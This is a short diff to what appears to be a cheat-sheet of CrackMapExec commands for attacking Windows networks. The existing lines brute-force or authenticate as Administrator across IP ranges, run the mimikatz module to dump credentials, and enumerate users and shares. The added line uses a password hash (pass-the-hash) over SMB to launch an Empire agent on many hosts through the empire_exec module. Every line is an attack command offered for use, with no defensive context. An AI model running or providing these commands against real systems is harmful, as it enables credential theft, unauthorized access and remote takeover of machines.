@@ -7,3 +7,7 @@ crackmapexec X.X.X.139 -t 100 -u Administrator -p 'XxxxX' -d WORKGROUP -M mimika
 crackmapexec X.X.X.X -t 100 -u Administrator -p 'XxxxX' -d WORKGROUP --lusers --shares
 
 crackmapexec ip_new.txt -t 100 -u Administrator -p 'XXXXXX' -d WORKGROUP
+
+=== NEW ==
+
+crackmapexec smb IPs.txt -u User -H 12345678902bbbe760ea1f1234567890 -M empire_exec -o LISTENER=CME
